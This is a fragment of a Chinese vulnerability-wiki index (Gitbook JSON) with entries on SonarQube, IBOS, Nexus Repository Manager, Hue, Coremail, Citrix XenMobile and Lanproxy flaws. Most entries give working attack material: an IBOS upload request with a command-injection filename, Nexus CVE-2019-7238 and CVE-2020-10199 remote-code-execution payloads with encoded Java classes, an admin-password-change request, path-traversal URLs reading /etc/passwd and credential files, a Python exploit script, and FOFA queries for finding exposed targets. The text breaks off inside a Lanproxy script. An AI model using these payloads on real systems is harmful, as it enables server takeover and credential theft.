CVE-2020-27986.html":{"url":"book/Web应用漏洞/SonarQube/SonarQube api 信息泄露漏洞 CVE-2020-27986.html","title":"SonarQube api 信息泄露漏洞 CVE-2020-27986","keywords":"","body":"SonarQube api 信息泄露漏洞 CVE-2020-27986 漏洞描述 SonarQube 某接口存在信息泄露漏洞，可以获取部分敏感信息 漏洞影响 [!NOTE] SonarQube FOFA [!NOTE] app=\"sonarQube-代码管理\" 漏洞复现 主页如下 漏洞POC http://xxx.xxx.xxx.xxx/api/settings/values 可泄露的为：明文SMTP、SVN和Gitlab等敏感信息 Goby & POC [!NOTE] SonarQube api Information leakage 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/IBOS/":{"url":"book/Web应用漏洞/IBOS/","title":"IBOS","keywords":"","body":"IBOS IBOS 数据库模块 任意文件上传漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/IBOS/IBOS 数据库模块 任意文件上传漏洞.html":{"url":"book/Web应用漏洞/IBOS/IBOS 数据库模块 任意文件上传漏洞.html","title":"IBOS 数据库模块 任意文件上传漏洞","keywords":"","body":"IBOS 数据库模块 任意文件上传漏洞 漏洞描述 IBOS 后台数据库模块 存在任意文件上传漏洞，攻击者进入后台后可以上传恶意文件控制服务器 漏洞影响 [!NOTE] IBOS FOFA [!NOTE] body=\"IBOS\" && body=\"login-panel\" 漏洞复现 登录页面如下 http://xxx.xxx.xxx.xxx/?r=dashboard/default/login 找到数据库备份模块 提交并抓包 修改filename参数发送包会上传test.php文件到根目录 backuptype=all&custom_enabled=1&method=shell&sizelimit=2048&extendins=0&sqlcompat=MYSQL41&sqlcharset=utf8&usehex=0&usezip=0&filename=peiqi%26echo \"\">test%PATHEXT:~0,1%php%26test&dbSubmit=1 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Nexus/":{"url":"book/Web应用漏洞/Nexus/","title":"Nexus","keywords":"","body":"Nexus Nexus Repository Manger extdirect 远程命令执行 CVE-2019-7238 Nexus Repository Manger group 后台远程命令执行 CVE-2020-10199 Nexus Repository Manger group 后台远程命令执行 CVE-2020-10204 Nexus Repository Manger change-password 低权限修改管理员密码漏洞 CVE-2020-11444 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Nexus/Nexus Repository Manger extdirect 远程命令执行 CVE-2019-7238.html":{"url":"book/Web应用漏洞/Nexus/Nexus Repository Manger extdirect 远程命令执行 CVE-2019-7238.html","title":"Nexus Repository Manger extdirect 远程命令执行 CVE-2019-7238","keywords":"","body":"Nexus Repository Manger extdirect 远程命令执行 CVE-2019-7238 漏洞描述 近日，研究人员发现了通用软件包仓库管理服务 Nexus Repository Manager 3 存在访问控制缺失及远程代码执行漏洞，漏洞编号为 CVE-2019-7238 漏洞影响 [!NOTE] Nexus 环境搭建 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238 FOFA [!NOTE] app=\"Nexus-Repository-Manager\" 漏洞复现 后台页面如下，任意上传 jar包 发送请求包执行命令 POST /service/extdirect HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: */* Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 7256 Connection: close {\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [{\"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0, \"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"function(x, y, z, c, integer, defineClass){ c=1.class.forName('java.lang.Character'); integer=1.class; x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055'; y=0; z=''; while (y lt x.length()){ z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0]; y += 2; };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\n y,\\n 'Exploit.Test234',\\n z.getBytes('latin1'), 0,\\n 3054\\n);x.getMethod('test', ''.class).invoke(null, 'cat /etc/passwd');'done!'}\\n\"}, {\"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1}], \"method\": \"previewAssets\"} 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Nexus/Nexus Repository Manger group 后台远程命令执行 CVE-2020-10199.html":{"url":"book/Web应用漏洞/Nexus/Nexus Repository Manger group 后台远程命令执行 CVE-2020-10199.html","title":"Nexus Repository Manger group 后台远程命令执行 CVE-2020-10199","keywords":"","body":"Nexus Repository Manger group 后台远程命令执行 CVE-2020-10199 漏洞描述 Nexus 后台存在一处任意EL表达式注入漏洞，只需要任意一个用户权限即可 漏洞影响 [!NOTE] Nexus 环境搭建 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10199 FOFA [!NOTE] app=\"Nexus-Repository-Manager\" 漏洞复现 漏洞触发需要任意账户权限 登录任意用户后修改 NXSESSIONID，发送请求包 POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: Connection: keep-alive NX-ANTI-CSRF-TOKEN: 0.6153568974227819 Content-Length: 4789 X-Requested-With: XMLHttpRequest X-Nexus-UI: true Content-Type: application/json 404: \"id\" Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=66e8bf5f-0544-4d7d-b1d7-970ce5158aff { \"name\": \"internal\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true }, \"group\": { \"memberNames\": [\"${' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}\"] } } 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Nexus/Nexus Repository Manger group 后台远程命令执行 CVE-2020-10204.html":{"url":"book/Web应用漏洞/Nexus/Nexus Repository Manger group 后台远程命令执行 CVE-2020-10204.html","title":"Nexus Repository Manger group 后台远程命令执行 CVE-2020-10204","keywords":"","body":"Nexus Repository Manger group 后台远程命令执行 CVE-2020-10204 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/Web应用漏洞/Nexus/Nexus Repository Manger change-password 低权限修改管理员密码漏洞 CVE-2020-11444.html":{"url":"book/Web应用漏洞/Nexus/Nexus Repository Manger change-password 低权限修改管理员密码漏洞 CVE-2020-11444.html","title":"Nexus Repository Manger change-password 低权限修改管理员密码漏洞 CVE-2020-11444","keywords":"","body":"Nexus Repository Manger change-password 低权限修改管理员密码漏洞 CVE-2020-11444 漏洞描述 Nexus Repository Manger存在低权限修改管理员密码漏洞，低权限用户发送特定的请求包可以修改管理员账号密码 漏洞影响 [!NOTE] Nexus 3.x OSS / Pro 环境搭建 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204 漏洞复现 漏洞触发需要任意账户权限 登录任意用户后修改 NXSESSIONID，发送请求包修改管理员账号密码 PUT /service/rest/beta/security/users/admin/change-password HTTP/1.1 Host: accept: application/json User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 NX-ANTI-CSRF-TOKEN: 0.6080434247960143 Content-Type: text/plain Origin: http://139.198.174.173:8081 Cookie: NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=76b37c99-046c-47a9-ba7d-fd4cfa33b7ff Content-Length: 11 data=123456 返回204则修改成功 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Hue/":{"url":"book/Web应用漏洞/Hue/","title":"Hue","keywords":"","body":"Hue Hue 后台编辑器命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Hue/Hue 后台编辑器命令执行漏洞.html":{"url":"book/Web应用漏洞/Hue/Hue 后台编辑器命令执行漏洞.html","title":"Hue 后台编辑器命令执行漏洞","keywords":"","body":"Hue 后台编辑器命令执行漏洞 漏洞描述 Hue 后台编辑器存在命令执行漏洞，攻击者通过编辑上传 xxx.sh 文件即可达到命令执行的目的 漏洞影响 [!NOTE] Hue 后台编辑器 FOFA [!NOTE] title=\"Hue - 欢迎使用 Hue\" 漏洞复现 登录页面如下 上传并编辑文件为执行的命令 按如下步骤点击即可执行想要执行的命令 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Coremail/":{"url":"book/Web应用漏洞/Coremail/","title":"Coremail","keywords":"","body":"Coremail Coremail 配置信息泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Coremail/Coremail 配置信息泄露漏洞.html":{"url":"book/Web应用漏洞/Coremail/Coremail 配置信息泄露漏洞.html","title":"Coremail 配置信息泄露漏洞","keywords":"","body":"Coremail 配置信息泄露漏洞 漏洞描述 Coremail 某个接口存在配置信息泄露漏洞，其中存在端口，配置信息等 漏洞影响 [!NOTE] Coremail 配置信息泄露漏洞 FOFA [!NOTE] app=\"Coremail邮件系统\" 漏洞复现 POC为 http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/ Goby & POC [!NOTE] Coremail configuration information disclosure 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Citrix XenMobile/":{"url":"book/Web应用漏洞/Citrix XenMobile/","title":"Citrix XenMobile","keywords":"","body":"Citrix XenMobile企业移动性管理系统 Citrix XenMobile 任意文件读取 CVE-2020-8209 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Citrix XenMobile/Citrix XenMobile 任意文件读取 CVE-2020-8209.html":{"url":"book/Web应用漏洞/Citrix XenMobile/Citrix XenMobile 任意文件读取 CVE-2020-8209.html","title":"Citrix XenMobile 任意文件读取 CVE-2020-8209","keywords":"","body":"Citrix XenMobile 任意文件读取 CVE-2020-8209 漏洞描述 XenMobile是Citrix开发的企业移动性管理软件。该产品允许企业管理员工的移动设备和移动应用程序。该软件的目的是通过允许员工安全地在企业拥有的和个人移动设备及应用程序上工作来提高生产率。 CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件 影响版本 [!NOTE] RP2之前的XenMobile服务器10.12 RP4之前的XenMobile服务器10.11 RP6之前的XenMobile服务器10.1010.9 RP5之前的XenMobile服务器 FOFA [!NOTE] title=\"XenMobile\" 漏洞复现 访问 http://xxx.xxx.xxx.xxx/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd 可以成功下载/etc/passwd文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Citrix XenMobile \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-8209.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] 含有CVE-2020-8209漏洞，成功读取/etc/passwd\\033[0m\\n{} \".format(response.text)) except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl > >> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Lanproxy/":{"url":"book/Web应用漏洞/Lanproxy/","title":"Lanproxy","keywords":"","body":"Lanproxy Lanproxy 目录遍历漏洞 CVE-2021-3019 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Lanproxy/Lanproxy 目录遍历漏洞 CVE-2021-3019.html":{"url":"book/Web应用漏洞/Lanproxy/Lanproxy 目录遍历漏洞 CVE-2021-3019.html","title":"Lanproxy 目录遍历漏洞 CVE-2021-3019","keywords":"","body":"Lanproxy 目录遍历漏洞 CVE-2021-3019 漏洞描述 Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据。 漏洞影响 [!NOTE] Lanproxy 0.1 FOFA [!NOTE] header= \"Server: LPS-0.1\" 环境搭建 https://github.com/ffay/lanproxy/ 漏洞复现 打开登录页面如下 使用Burp抓包发送如下请求 GET /../conf/config.properties HTTP/1.1 Host: xxx.xxx.xxx.xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close 成功在配置文件中读取 账号密码 试着读取其他敏感文件 漏洞利用POC Github:CVE-2021-3019 #!/usr/bin/env python3 # -*- encoding: utf-8 -*- ''' @File : urllib.py @Time : 2021/01/10 21:59:32 @Author : _0xf4n9x_ @Version : 1.0 @Contact : fanq.xu@gmail.com @Desc : None ''' import sys import argparse import os from urllib import request from urllib import error banner = \"\"\" ###### ## ## ######## ####### ##### ####### ## ####### ##### ## ####### ## ## ## ## ## ## ## ## ## ## ## #### ## ## ## ## #### ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ##### ####### ## ## ####### ## ##### ####### ## ## ## ######## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ###### ### ######## ######### ##### ######### ###### ####### ##### ###### ####### Author: _0xf4n9x_\"\"\" headers = { 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; 